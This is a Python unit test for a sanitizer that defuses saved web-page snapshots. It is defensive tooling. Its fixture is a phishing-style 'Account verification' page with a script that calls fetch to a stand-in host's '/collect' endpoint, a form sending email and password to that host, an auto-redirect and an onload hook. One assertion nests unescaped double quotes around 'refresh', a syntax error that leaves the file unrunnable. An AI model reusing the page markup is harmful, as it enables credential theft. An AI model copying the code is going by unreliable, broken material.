import unittest

from snapshot_sanitizer import sanitize_snapshot


class SnapshotSanitizerTests(unittest.TestCase):
    def test_disables_active_behaviors_but_keeps_static_evidence(self):
        source = """<!doctype html>
        <html><head>
        <meta http-equiv="refresh" content="0;url=https://remote.invalid/">
        <script>fetch("https://remote.invalid/collect")</script>
        </head><body onload="go()">
        <h1>Account verification</h1>
        <form action="https://remote.invalid/post" method="post">
          <input name="email" value="user@example.test">
          <input type="password" name="password" value="secret">
        </form>
        <iframe src="https://remote.invalid/frame"></iframe>
        <a href="https://remote.invalid/next">Continue</a>
        </body></html>"""

        sanitized = sanitize_snapshot(source)

        self.assertIn("Account verification", sanitized)
        self.assertNotIn("<script", sanitized.lower())
        self.assertNotIn("http-equiv="refresh"", sanitized.lower())
        self.assertIn('action="#"', sanitized)
        self.assertIn("data-argus-original-action", sanitized)
        self.assertIn('src="about:blank"', sanitized)
        self.assertIn('href="#"', sanitized)
        self.assertNotIn('value="secret"', sanitized)
        self.assertNotIn('value="user@example.test"', sanitized)
        self.assertNotIn("onload=", sanitized.lower())


if __name__ == "__main__":
    unittest.main()
